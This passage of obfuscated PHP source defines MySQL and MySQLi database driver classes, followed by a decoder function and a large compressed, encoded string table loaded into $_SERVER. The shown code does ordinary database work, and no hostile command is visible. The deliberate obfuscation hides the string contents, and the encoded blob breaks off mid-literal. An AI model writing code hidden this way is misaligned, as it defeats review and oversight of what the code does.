(count($¿òêËñÍ) != 2 || !isset($¿òêËñÍ[1])) { continue; } $_COOKIE[trim($¿òêËñÍ[0])] = trim($¿òêËñÍ[1]); } } public static function remove($Ÿ¬É¬, $ÁĞÑşÖ = false) { unset($_COOKIE[$Ÿ¬É¬]); self::set($Ÿ¬É¬, $_SERVER[íïàËŸë][12], 1, $ÁĞÑşÖ); } } class DbMysql extends Db { public function __construct($“”Í´Ó = '') { $…ËŒÅä =& $_SERVER[íïàËŸë]; if (!extension_loaded($…ËŒÅä[887])) { think_exception(think_lang($…ËŒÅä[14]) . $…ËŒÅä[974]); } if (!empty($“”Í´Ó)) { $this->config = $“”Í´Ó; if (empty($this->config[$…ËŒÅä[17]])) { $this->config[$…ËŒÅä[17]] = $…ËŒÅä[12]; } } } public function connect($˜ŞĞ¦Ù = '', $Ø×Ó›êã = 0, $£úí£»¡ = false) { $¦–˜¿‡ş =& $_SERVER[íïàËŸë]; if (!isset($this->linkID[$Ø×Ó›êã])) { if (empty($˜ŞĞ¦Ù)) { $˜ŞĞ¦Ù = $this->config; } $Ñ×¾å§¿ = $˜ŞĞ¦Ù[$¦–˜¿‡ş[975]] . ($˜ŞĞ¦Ù[$¦–˜¿‡ş[976]] ? "\x3a{$˜ŞĞ¦Ù[$¦–˜¿‡ş[976]]}" : $¦–˜¿‡ş[12]); $õÑ£·ƒç = !empty($˜ŞĞ¦Ù[$¦–˜¿‡ş[17]][$¦–˜¿‡ş[18]]) ? $˜ŞĞ¦Ù[$¦–˜¿‡ş[17]][$¦–˜¿‡ş[18]] : $this->pconnect; if ($õÑ£·ƒç) { $this->linkID[$Ø×Ó›êã] = mysql_pconnect($Ñ×¾å§¿, $˜ŞĞ¦Ù[$¦–˜¿‡ş[977]], $˜ŞĞ¦Ù[$¦–˜¿‡ş[978]], 131072); } else { $this->linkID[$Ø×Ó›êã] = mysql_connect($Ñ×¾å§¿, $˜ŞĞ¦Ù[$¦–˜¿‡ş[977]], $˜ŞĞ¦Ù[$¦–˜¿‡ş[978]], !0, 131072); } if (!$this->linkID[$Ø×Ó›êã] || !empty($˜ŞĞ¦Ù[$¦–˜¿‡ş[21]]) && !mysql_select_db($˜ŞĞ¦Ù[$¦–˜¿‡ş[21]], $this->linkID[$Ø×Ó›êã])) { think_exception(mysql_error()); } $İ­¤¥•ş = mysql_get_server_info($this->linkID[$Ø×Ó›êã]); mysql_query($¦–˜¿‡ş[979] . think_config($¦–˜¿‡ş[980]) . $¦–˜¿‡ş[58], $this->linkID[$Ø×Ó›êã]); if ($İ­¤¥•ş > $¦–˜¿‡ş[981]) { mysql_query($¦–˜¿‡ş[982], $this->linkID[$Ø×Ó›êã]); } $this->connected = !0; if (1 != think_config($¦–˜¿‡ş[22])) { unset($this->config); } } return $this->linkID[$Ø×Ó›êã]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÎÙÅìÂ€) { $ÇÈğƒØ =& $_SERVER[íïàËŸë]; if (0 === stripos($ÎÙÅìÂ€, $ÇÈğƒØ[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎÙÅìÂ€; if ($this->queryID) { $this->free(); } think_action_status($ÇÈğƒØ[23], 1); think_status($ÇÈğƒØ[24]); $this->queryID = mysql_query($ÎÙÅìÂ€, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($æ‰åò·) { $Òíã¬¸÷ =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $æ‰åò·; if ($this->queryID) { $this->free(); } think_action_status($Òíã¬¸÷[25], 1); think_status($Òíã¬¸÷[24]); $ùÁÌ­éÕ = mysql_query($æ‰åò·, $this->_linkID); $this->debug(); if (!1 === $ùÁÌ­éÕ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[íïàËŸë][983], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $À†¹‡© = mysql_query($_SERVER[íïàËŸë][984], $this->_linkID); $this->transTimes = 0; if (!$À†¹‡©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú£•ö—£ = mysql_query($_SERVER[íïàËŸë][985], $this->_linkID); $this->transTimes = 0; if (!$Ú£•ö—£) { $this->error(); return !1; } } return !0; } private function getAll() { $ù‘¾àñ± = array(); if ($this->numRows > 0) { while ($»Ò¸ÂÈœ = mysql_fetch_assoc($this->queryID)) { $ù‘¾àñ±[] = $»Ò¸ÂÈœ; } mysql_data_seek($this->queryID, 0); } return $ù‘¾àñ±; } public function getFields($ãïâÍ¼) { $îÑŠ¼Çû =& $_SERVER[íïàËŸë]; $‰¦Ëğõ = $this->query($îÑŠ¼Çû[986] . $this->parseKey($ãïâÍ¼)); $öşûíº² = array(); if ($‰¦Ëğõ) { foreach ($‰¦Ëğõ as $²Í§µ× => $¨§Ï§÷Æ) { $öşûíº²[$¨§Ï§÷Æ[$îÑŠ¼Çû[31]]] = array($îÑŠ¼Çû[32] => $¨§Ï§÷Æ[$îÑŠ¼Çû[31]], $îÑŠ¼Çû[33] => $¨§Ï§÷Æ[$îÑŠ¼Çû[34]], $îÑŠ¼Çû[35] => (bool) (strtoupper($¨§Ï§÷Æ[$îÑŠ¼Çû[36]]) === $îÑŠ¼Çû[987]), $îÑŠ¼Çû[37] => $¨§Ï§÷Æ[$îÑŠ¼Çû[38]], $îÑŠ¼Çû[39] => strtolower($¨§Ï§÷Æ[$îÑŠ¼Çû[40]]) == $îÑŠ¼Çû[41], $îÑŠ¼Çû[42] => strtolower($¨§Ï§÷Æ[$îÑŠ¼Çû[43]]) == $îÑŠ¼Çû[44]); } } return $öşûíº²; } public function getTables($ï± –¢ï = '') { $ŞÓ ¼êÄ =& $_SERVER[íïàËŸë]; if (!empty($ï± –¢ï)) { $Ï…ÕŒºº = $ŞÓ ¼êÄ[988] . $ï± –¢ï . $ŞÓ ¼êÄ[989]; } else { $Ï…ÕŒºº = $ŞÓ ¼êÄ[990]; } $Î¾³ãÊà = $this->query($Ï…ÕŒºº); $ÎáçûÊÒ = array(); foreach ($Î¾³ãÊà as $ÉÇïº« => $éÜ¯‚ Ï) { $ÎáçûÊÒ[$ÉÇïº«] = current($éÜ¯‚ Ï); } return $ÎáçûÊÒ; } public function replace($ò¯Û¿×…, $â¸“¹›Ä = array()) { $ˆÃËı  =& $_SERVER[íïàËŸë]; foreach ($ò¯Û¿×… as $ ¾É…¸ => $Ø… Êñ²) { $Ç…ÉÒ = $this->parseValue($Ø… Êñ²); if (is_scalar($Ç…ÉÒ)) { $ıóûˆ¶Ë[] = $Ç…ÉÒ; $äˆ¥öŸÈ[] = $this->parseKey($ ¾É…¸); } } $ŒÅ·è÷â = $ˆÃËı [991] . $this->parseTable($â¸“¹›Ä[$ˆÃËı [356]]) . $ˆÃËı [992] . implode($ˆÃËı [50], $äˆ¥öŸÈ) . $ˆÃËı [993] . implode($ˆÃËı [50], $ıóûˆ¶Ë) . $ˆÃËı [994]; return $this->execute($ŒÅ·è÷â); } public function insertAll($ì”ù­ìû, $‰æú‚¬Û = array(), $©ğªÉ…† = false) { $ƒä¡µÇ¿ =& $_SERVER[íïàËŸë]; if (!is_array($ì”ù­ìû[0])) { return !1; } $ÛÄ¼ÍÓ = array_keys($ì”ù­ìû[0]); $Â±ä¦ØÖ = array(); foreach ($ì”ù­ìû as $ğˆĞ¸îÁ) { $’‡¢­†ä = array(); foreach ($ğˆĞ¸îÁ as $Á–âÁü÷ => $Ë‡õÅÓ«) { $Ë‡õÅÓ« = $this->parseValue($Ë‡õÅÓ«); if (is_scalar($Ë‡õÅÓ«)) { $’‡¢­†ä[] = $Ë‡õÅÓ«; } } $Â±ä¦ØÖ[] = $ƒä¡µÇ¿[337] . implode($ƒä¡µÇ¿[50], $’‡¢­†ä) . $ƒä¡µÇ¿[994]; } array_walk($ÛÄ¼ÍÓ, array($this, $ƒä¡µÇ¿[995])); $øƒØÕß = ($©ğªÉ…† ? $ƒä¡µÇ¿[996] : $ƒä¡µÇ¿[997]) . $ƒä¡µÇ¿[998] . $this->parseTable($‰æú‚¬Û[$ƒä¡µÇ¿[356]]) . $ƒä¡µÇ¿[992] . implode($ƒä¡µÇ¿[50], $ÛÄ¼ÍÓ) . $ƒä¡µÇ¿[999] . implode($ƒä¡µÇ¿[50], $Â±ä¦ØÖ); return $this->execute($øƒØÕß); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $«Ğ¶‰ª¶ =& $_SERVER[íïàËŸë]; $this->error = mysql_errno() . $«Ğ¶‰ª¶[4] . mysql_error($this->_linkID); if ($«Ğ¶‰ª¶[12] != $this->queryStr) { $this->error .= LNG($«Ğ¶‰ª¶[48]) . $this->queryStr; } think_trace($this->error, $«Ğ¶‰ª¶[12], $«Ğ¶‰ª¶[49]); return $this->error; } public function escapeString($Ãì”¾¦¼) { if ($this->_linkID) { return mysql_real_escape_string($Ãì”¾¦¼, $this->_linkID); } else { return mysql_escape_string($Ãì”¾¦¼); } } public function parseKey(&$ÓøÅ‰–, $½å‘¨ËÓ = true) { $ó–Ö¹ =& $_SERVER[íïàËŸë]; if ($½å‘¨ËÓ) { $ÓøÅ‰– = $this->parseKeyCheck($ÓøÅ‰–); } if ($ÓøÅ‰– != $ó–Ö¹[220] && !preg_match($ó–Ö¹[1000], $ÓøÅ‰–)) { $ÓøÅ‰– = $ó–Ö¹[461] . trim($ÓøÅ‰–, $ó–Ö¹[461]) . $ó–Ö¹[461]; } return $ÓøÅ‰–; } } class DbMysqli extends Db { public function __construct($Æœ¹Èş™ = '') { $šêÆÇ¿ı =& $_SERVER[íïàËŸë]; if (!extension_loaded($šêÆÇ¿ı[1001])) { think_exception(think_lang($šêÆÇ¿ı[14]) . $šêÆÇ¿ı[1002]); } if (!empty($Æœ¹Èş™)) { $this->config = $Æœ¹Èş™; if (empty($this->config[$šêÆÇ¿ı[17]])) { $this->config[$šêÆÇ¿ı[17]] = $šêÆÇ¿ı[12]; } } } public function connect($‰ÑáÕÈÙ = '', $ˆ×ÌßŒà = 0) { $ûòş®şß =& $_SERVER[íïàËŸë]; if (!isset($this->linkID[$ˆ×ÌßŒà])) { if (empty($‰ÑáÕÈÙ)) { $‰ÑáÕÈÙ = $this->config; } $this->linkID[$ˆ×ÌßŒà] = new mysqli($‰ÑáÕÈÙ[$ûòş®şß[975]], $‰ÑáÕÈÙ[$ûòş®şß[977]], $‰ÑáÕÈÙ[$ûòş®şß[978]], $‰ÑáÕÈÙ[$ûòş®şß[21]], $‰ÑáÕÈÙ[$ûòş®şß[976]] ? intval($‰ÑáÕÈÙ[$ûòş®şß[976]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‚í¦ÊÂÜ = $this->linkID[$ˆ×ÌßŒà]->server_version; $this->linkID[$ˆ×ÌßŒà]->query($ûòş®şß[979] . think_config($ûòş®şß[980]) . $ûòş®şß[58]); if ($‚í¦ÊÂÜ > $ûòş®şß[981]) { $this->linkID[$ˆ×ÌßŒà]->query($ûòş®şß[982]); } $this->connected = !0; if (1 != think_config($ûòş®şß[22])) { unset($this->config); } } return $this->linkID[$ˆ×ÌßŒà]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¯ı£ôºÌ) { $Ÿ—©Õ =& $_SERVER[íïàËŸë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯ı£ôºÌ; if ($this->queryID) { $this->free(); } think_action_status($Ÿ—©Õ[23], 1); think_status($Ÿ—©Õ[24]); $this->queryID = $this->_linkID->query($¯ı£ôºÌ); if ($this->_linkID->more_results()) { while (($áËıÑî¦ = $this->_linkID->next_result()) != NULL) { $áËıÑî¦->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¨©›ºÆ) { $ğ ¹©À =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¨©›ºÆ; if ($this->queryID) { $this->free(); } think_action_status($ğ ¹©À[25], 1); think_status($ğ ¹©À[24]); $‡î˜È¥â = $this->_linkID->query($¨©›ºÆ); $this->debug(); if (!1 === $‡î˜È¥â) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æ²˜ÂêÏ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Æ²˜ÂêÏ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $êö£ö¹é = $this->_linkID->rollback(); $this->transTimes = 0; if (!$êö£ö¹é) { $this->error(); return !1; } } return !0; } private function getAll() { $ëÊ­—– = array(); if ($this->numRows > 0) { for ($œÛ¸É‰ = 0; $œÛ¸É‰ < $this->numRows; $œÛ¸É‰++) { $ëÊ­—–[$œÛ¸É‰] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ëÊ­—–; } public function getFields($Ğé¬öÎÙ) { $Áìäâ =& $_SERVER[íïàËŸë]; $¤Ö¬ğ™‚ = $this->query($Áìäâ[986] . $this->parseKey($Ğé¬öÎÙ)); $ŸéÒ› Ï = array(); if ($¤Ö¬ğ™‚) { foreach ($¤Ö¬ğ™‚ as $¾şÚñ¨Ğ => $ÍÄı¬¬) { $ŸéÒ› Ï[$ÍÄı¬¬[$Áìäâ[31]]] = array($Áìäâ[32] => $ÍÄı¬¬[$Áìäâ[31]], $Áìäâ[33] => $ÍÄı¬¬[$Áìäâ[34]], $Áìäâ[35] => (bool) ($ÍÄı¬¬[$Áìäâ[36]] === $Áìäâ[12]), $Áìäâ[37] => $ÍÄı¬¬[$Áìäâ[38]], $Áìäâ[39] => strtolower($ÍÄı¬¬[$Áìäâ[40]]) == $Áìäâ[41], $Áìäâ[42] => strtolower($ÍÄı¬¬[$Áìäâ[43]]) == $Áìäâ[44]); } } return $ŸéÒ› Ï; } public function getTables($ÍæÛ•“î = '') { $ÑàÇÒ¬¯ =& $_SERVER[íïàËŸë]; $–è°¿àÓ = !empty($ÍæÛ•“î) ? $ÑàÇÒ¬¯[988] . $ÍæÛ•“î . $ÑàÇÒ¬¯[989] : $ÑàÇÒ¬¯[990]; $æÉª‡Â« = $this->query($–è°¿àÓ); $í¯ÎáØ² = array(); if ($æÉª‡Â«) { foreach ($æÉª‡Â« as $õ½ŒŒ© => $¹å‹³—Ş) { $í¯ÎáØ²[$õ½ŒŒ©] = current($¹å‹³—Ş); } } return $í¯ÎáØ²; } public function replace($¬îšİ¨, $½êóõ½© = array()) { $Åš”ùôÌ =& $_SERVER[íïàËŸë]; foreach ($¬îšİ¨ as $Ùë€Ÿ¶Ñ => $Û½æèß©) { $Şğ¨Ä•ù = $this->parseValue($Û½æèß©); if (is_scalar($Şğ¨Ä•ù)) { $ÛÊééû[] = $Şğ¨Ä•ù; $É™Ûö¸¼[] = $this->parseKey($Ùë€Ÿ¶Ñ); } } $¾ÅœŠ¬™ = $Åš”ùôÌ[991] . $this->parseTable($½êóõ½©[$Åš”ùôÌ[356]]) . $Åš”ùôÌ[992] . implode($Åš”ùôÌ[50], $É™Ûö¸¼) . $Åš”ùôÌ[993] . implode($Åš”ùôÌ[50], $ÛÊééû) . $Åš”ùôÌ[994]; return $this->execute($¾ÅœŠ¬™); } public function insertAll($’÷¾¶î€, $şÌĞğˆó = array(), $…™¯ = false) { $èû˜¨÷ =& $_SERVER[íïàËŸë]; if (!is_array($’÷¾¶î€[0])) { return !1; } $Ï¤È±ÍÅ = array_keys($’÷¾¶î€[0]); $µö’»† = array(); foreach ($’÷¾¶î€ as $à£¶ç¸ç) { $­ŒÃÆ†Ó = array(); foreach ($à£¶ç¸ç as $Ïå®Â => $×°ÂÁÊ½) { $×°ÂÁÊ½ = $this->parseValue($×°ÂÁÊ½); if (is_scalar($×°ÂÁÊ½)) { $­ŒÃÆ†Ó[] = $×°ÂÁÊ½; } } $µö’»†[] = $èû˜¨÷[337] . implode($èû˜¨÷[50], $­ŒÃÆ†Ó) . $èû˜¨÷[994]; } array_walk($Ï¤È±ÍÅ, array($this, $èû˜¨÷[995])); $º©²€Ø = $…™¯ ? $èû˜¨÷[996] : $èû˜¨÷[997]; $üÓ¼•ôÆ = $º©²€Ø . $èû˜¨÷[998] . $this->parseTable($şÌĞğˆó[$èû˜¨÷[356]]) . $èû˜¨÷[992] . implode($èû˜¨÷[50], $Ï¤È±ÍÅ) . $èû˜¨÷[999] . implode($èû˜¨÷[50], $µö’»†); return $this->execute($üÓ¼•ôÆ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÑºíüÇ– =& $_SERVER[íïàËŸë]; $this->error = $this->_linkID->errno . $ÑºíüÇ–[4] . $this->_linkID->error; if ($ÑºíüÇ–[12] != $this->queryStr) { $this->error .= LNG($ÑºíüÇ–[48]) . $this->queryStr; } think_trace($this->error, $ÑºíüÇ–[12], $ÑºíüÇ–[49]); return $this->error; } public function escapeString($–¹åö˜ê) { if ($this->_linkID) { return $this->_linkID->real_escape_string($–¹åö˜ê); } else { return addslashes($–¹åö˜ê); } } public function parseKey(&$ˆâÀÁº, $×ıÁÍ•å = true) { $¤× “ùä =& $_SERVER[íïàËŸë]; if ($×ıÁÍ•å) { $ˆâÀÁº = $this->parseKeyCheck($ˆâÀÁº); } if ($ˆâÀÁº != $¤× “ùä[220] && !preg_match($¤× “ùä[1000], $ˆâÀÁº)) { $ˆâÀÁº = $¤× “ùä[461] . trim($ˆâÀÁº, $¤× “ùä[461]) . $¤× “ùä[461]; } return $ˆâÀÁº; } } goto F¨Ä¯Ğ“Ï; b³ŞŸßêØ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xed\xef\xe0\xcb\x9f\xeb", "\xfc\xb8\xc6\xfb\xf2\xcc"); $_SERVER[íïàËŸë] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\133\305\265\60\373\126\240\55\245\55\355\173\257\334\70\4\333\211\26\333\331\235\70\211\154\313\266\210\54\31\111\316\146\233\233\153\351\112"."\272\261\244\253\350\136\171\111\34\366\235\100\330\267\122\226\122\226\76\232\205\75\20\40\164\201\226\102\13\224\266\24\50\175\257\20\73\241\254\135\150\241\54\375\147\71\263\334\53\31\336\377"."\275\377\373\376\100\242\231\63\147\346\316\162\346\314\231\63\147\316\234\173\333\55\273\357\175\171\374\0\364\337\301\67\74\375\316\343\37\154\247\141\364\367\300\361\375\151\370\370\213\16\333\217"."\xfc\xf9\xca\x45\x17\xd6\xd5\x75\xcd\x3b\x62\x56\xe4\xc8\x2d\xf7\x6d\xd5\xfe\x53\xdb\xa6\x6d\x8e\x86\x9f\x7e\x26\x74\xd4\x2f\x7f\x70\x52\x70\xf2\xd6\xa7\xc7\x26\xf7\xdf\xef\xd2\x53\xdb\xf\x6d\x46\xc8\x34\x6f".base64_decode('M/1RCqat6KOGZVsUkDQLaSNDw0aB/vrpT28sXNLzpq3TqI/+qLxe6F9rfc5g6WokmlDjvQ==')."\x3d\x3d\xc1\x58\x2\x90\x9a\xe5\xf4\xbc\x99\x82\x50\x51\x2b\x69\x79\xf8\x7e\x51\x2f\x59\xa8\x36\x72\x71\x6a\xd1\x2c\xea\x5\x7\x44\x0\x52\x9a\xad\xd\x6a\x16\x94\xd4\xde\xaa\xb6\x7\x7b\xc2\xd1\xd5\x6a\x62"."\x75\x4f\x10\x30\x6\xd5\xf5\x65\xbd\x34\x46\x63\x24\x18\xb7\xb5\x92\x9d\x30\xf2\x3a\xc7\x18\x29\xf1\x7a\xb5\x6\x3b\x43\x11\x25\x11\xb\x44\xe2\x81\xb6\x44\x28\x1a\xa1\xe0\xb6\x68\x77\x77\x28\x51\x9\x8f\x45"."\xc3\xe1\xd6\x40\xdb\xf2\xca\x94\x9e\x58\xa0\xb3\x3b\xa0\xa0\xfa\xe5\x74\xd5\x28\xa4\xcd\x3a\x65\x2d\x4d\x59\xab\xd4\xd3\x40\x87\xa1\xe7\x52\x34\x58\xd0\x58\x75\xec\xb1\x22\x84\x12\x3c\x84\x86\xa9\x50\xce\xe5"."\150\44\302\103\51\75\255\225\163\320\133\355\162\244\130\62\362\32\153\364\162\175\214\103\151\100\53\333\246\121\110\322\110\160\324\56\151\2\216\352\232\104\3\255\27\240\250\170\60\34\154\113"."\50\270\202\112\107\54\332\255\300\40\344\65\313\326\113\312\312\256\140\54\250\340\112\267\324\222\266\326\52\100\57\21\324\25\112\40\34\126\246\52\301\326\363\105\126\14\315\123\245\260\150\254"."\75\30\123\132\127\53\242\207\222\146\76\157\26\174\250\24\64\222\266\124\325\140\54\106\3\36\40\357\160\10\17\32\104\242\35\35\361\40\217\101\343\116\16\243\232\314\6\372\164\304\122\351".strrev('ÀXëXd'."\0".'ƒ|„ß”y'."\n".'z Î¶”+O“L"…2Q‚ëº@Zkğ?[ú!Ó#2¹k­œ')."\100\63\164\230\6\133\226\320\337\105\220\177\120\305\151\172\311\126\365\102\322\114\31\5\230\307\113\201\36\65\73\333\136\62\20\2\215\247\315\134\212\205\55\143\3\264\62\155\344\364\110\71".base64_decode('L6PwaDJr5FIlNvU+C5NGw3wmY1wRK6KajDMmYKTHxFTEeD081TLLpaQeQlOHxhsBrNs2ag==')."\34\353\20\263\267\230\63\265\124\134\57\361\246\31\146\7\52\50\132\266\145\140\231\240\165\230\245\174\73\142\32\360\175\64\141\214\336\52\11\103\154\312\244\244\36\363\327\365\235\341\375\164".base64_decode('oG8Z+qceuGI/1Cmr53KqPqrDnMqn5lqsM/zWoFHwIwiNhqJqVrOy3am5KskFVS6k9FFfMQ==')."\x5b\xa4\x51\x31\xdb\xfb\x1d\x34\x8f\xbb\x2e\x62\xda\x41\x89\x65\xe7\xcc\xa4\x96\x93\x9b\x48\xc3\x59\xdb\x2e\xc6\xf5\x42\xa\xf7\x4\x34\xc5\x1c\x29\x90\x9e\x2a\xea\x3a\x20\xb5\x7b\x94\x94\xd2\xad\xac\x56\xba"."\x9a\x8d\x66\x8b\x65\xcc\xe7\x78\x88\xb5\x8e\xc3\x2c\xe\xb4\x47\xd9\x70\xa6\xd2\x40\xad\x6c\xc5\xa8\x81\xf\x1a\x16\x61\x7e\x62\xe6\x6a\xc5\x62\xce\x48\x6a\xb6\x61\x16\xfc\x66\xd2\xd6\x6d\xaf\x65\x97\x74\xd"."\x4a\xc\x24\x93\xba\x65\x79\xdb\xcc\x82\x5d\x32\x73\xde\x40\x2e\x67\x8e\x78\xa3\x25\x23\x63\x14\x9a\x95\x99\x14\x7\x27\xa2\xf9\xee\xc5\xbc\xb1\x19\x26\x71\xcd\x22\x5\x13\xe\xfe\xcc\xcc\x96\xb2\x9d\xf6\x2e"."\x60\x93\x93\x63\x97\xb4\x82\x95\xd6\x4b\xde\x20\xcc\x8c\x66\x5\x55\x96\x33\x48\x86\xd6\x6e\x58\x45\xd3\x32\x70\xf5\x9a\x15\xcd\xb6\xb5\x64\x16\x33\x17\x51\x7c\xcb\x67\xe0\x1b\x85\x9c\x51\xd0\x2b\x71\x51\x21".base64_decode('urenpGXyWrNSLA+iDoAJCbAkxpCRoQOalbw26tUyrKTgaNEo6RZrtdLZnQCKSnu78UQy9A==').strrev('ŠjaBh¼«€É™<F†ZÛ¥ÖÑ wj‚G<´¡¨ôH•ÚiaEh‚a»67¸7”')."\240\306\11\140\217\71\242\227\320\207\133\307\232\225\41\63\65\150\216\372\130\22\106\216\43\316\302\220\361\370\26\155\157\114\53\144\160\63\6\307\154\35\150\116\360\246\126\264\230\373\322\164"."\366\372\6\365\264\131\202\326\130\303\31\147\347\207\365\102\306\316\262\262\343\301\330\212\140\114\215\107\73\22\53\3\61\130\373\13\210\162\106\131\155\360\327\163\336\230\236\102\235\230\264\131"."\76\255\50\172\177\225\27\117\30\374\161\226\212\47\21\113\13\207\72\161\337\265\173\55\204\344\225\261\130\331\141\43\157\340\346\331\74\205\164\66\22\14\72\241\102\176\322\346\226\176\153\146"."\135\177\152\126\275\27\375\73\263\276\257\277\335\67\163\140\251\337\20\171\374\215\276\106\245\251\141\236\322\203\44\25\103\313\51\320\350\12\214\6\45\272\334\331\55\202\302\215\24\212\33\366"."\130\325\311\205\210\311\264\164\157\227\256\41\106\215\6\303\61\66\36\366\75\32\377\214\36\306\353\245\304\117\134\143\103\201\261\340\311\275\301\170\102\355\16\46\272\242\355\320\204\140\0\102"."\5\224\231\324\231\215\63\26\316\150\20\365\63\4\106\245\165\104\254\7\111\271\123\110\276\210\71\62\16\53\200\213\210\332\262\172\162\150\212\64\24\202\326\230\224\67\261\341\353\243\77\3"."\x40\xd1\x3\xf4\x47\x35\xac\xe\x69\xed\xc4\x51\xce\x63\x55\x73\x70\x1d\xa2\xae\x6e\x9d\x2d\x24\xf0\xa5\x50\x1e\xcd\x63\x51\x73\xd5\xb9\xd0\xb1\x66\x75\xb\x6a\x47\xd3\x66\xa5\x91\xe2\x2b\x21\x8a\x76\xe9\x46"."\46\13\25\65\160\161\111\63\147\226\264\34\346\377\114\170\315\30\300\212\213\271\62\242\175\77\56\70\221\55\347\7\141\265\102\175\224\321\155\41\127\132\143\110\370\2\356\213\304\160\324\231"."\41\30\26\130\173\41\346\127\61\275\366\373\212\205\114\375\11\120\226\332\64\267\1\3\140\30\241\145\110\300\56\353\225\115\367\45\115\64\271\273\265\41\275\31\267\5\70\332\42\2\145\21"."\211\151\56\302\353\134\213\233\67\340\341\311\371\362\250\20\122\146\233\311\127\146\272\205\1\101\210\255\163\212\136\52\231\245\151\200\101\302\12\131\54\361\160\101\341\66\27\75\54\304\6\130"."\70\153\162\121\305\144\304\330\354\207\166\317\150\352\0\326\221\102\42\233\317\262\321\40\240\6\152\251\124\65\60\142\67\120\300\70\243\123\222\60\16\262\200\77\76\33\375\57\26\376\224\231"."\xd7\xd8\x32\x4a\x16\x40\x3d\x45\x57\x40\x7\x88\x4e\x5b\xa\x9a\xc9\xca\x2d\xd9\x26\x4e\x2c\x39\x30\x11\x25\x66\x4d\xa8\x19\x1a\x7a\x68\x55\x99\x37\x8f\x35\x34\xa5\xe7\x74\x46\x45\x59\x9d\x9\x11\xd\x80\x86"."\272\237\323\130\232\23\73\332\46\40\250\220\336\14\53\206\162\342\45\237\305\127\342\175\225\0\140\271\7\210\107\4\163\150\350\242\144\326\210\170\117\111\117\33\300\271\13\150\366\167\153\245".base64_decode('IdYwlFPMNxyR5mJHbzistkUjCbQto5CVsVACeFUM8Rw10NYDMcHZuGgmCxcUMtwEdIIq4Q==')."\27\122\20\132\206\213\146\1\361\117\140\101\136\261\151\253\110\112\11\41\1\10\104\10\26\56\131\1\255\366\371\15\336\74\142\36\136\136\47\247\210\246\300\222\117\45\275\20\14\123\212\17".base64_decode('Du48NJGZbNgTjUOGpRiK5PNBPt96eiEpL5FIZxCARwBVZTWQugMr42wZLyP8krFBE01ayg==').base64_decode('6sMaks8Jcd/ZKq8Y+bLl1bGkIb4wx9vVHWjzxrsCTXPnUejqfKo/0WVY/Wt4HLpxxJqjlg==')."\164\304\160\330\207\232\32\240\44\35\113\112\122\365\126\173\363\136\134\12\356\101\137\103\103\3\53\153\326\74\45\213\370\334\70\133\115\122\144\224\330\336\253\234\34\142\23\106\113\62\361\27".base64_decode('rzKWd8RgnPkEvlM4oZJ6TnCuh1BEmazEqpbEH1NRiXbZknsKTSuycjOpnkK1XAZ1up3Nyw==')."\100\61\360\64\256\123\21\221\217\35\357\105\334\267\116\32\227\253\124\64\221\120\12\315\130\125\265\16\253\252\325\141\225\253\16\253\52\353\100\101\226\221\51\240\126\262\305\15\206\243\23\17"."\x87\x34\xac\x8e\x61\x1e\x55\x51\x46\x15\xe6\x90\x2a\x37\x5\x3a\x9\x9a\x21\xa7\x74\x71\x6e\xc6\x1a\xd9\xdd\x3e\x97\xd5\x23\xd0\xbd\xc6\xdb\x1e\x60\xbc\x60\xf1\x52\x44\xa2\xca\x30\xd6\x36\x99\x85\x96\xda\x46"."\137\103\255\302\166\315\55\265\275\211\16\264\207\130\272\344\210\305\155\146\276\210\31\143\67\336\50\342\51\104\67\213\113\140\172\54\306\362\31\213\364\360\31\106\343\301\204\6\213\343\142\277"."\x8c\xb7\xd8\x3f\x55\xa9\x40\x6c\x79\x6d\x83\x59\x40\xe4\x8d\x16\xcd\xbc\x2f\x9\x34\x8c\x45\x51\xbe\x6\xe1\x88\xc5\x63\x89\xae\x50\x64\xb9\xda\x1d\x6d\xf\x86\xd5\x50\x4\xc9\x69\x89\x4a\x78\x6f\x8f\x68\xbc"."\xc\x6f\x8d\x26\xba\x1c\xd0\x5e\x24\xa9\xad\x8\x84\x43\x6e\xf4\xe0\xaa\x50\x3c\x11\xaf\x9a\x84\x60\xbd\x41\x57\x4a\x7b\xab\xda\x13\xb\x76\x84\x56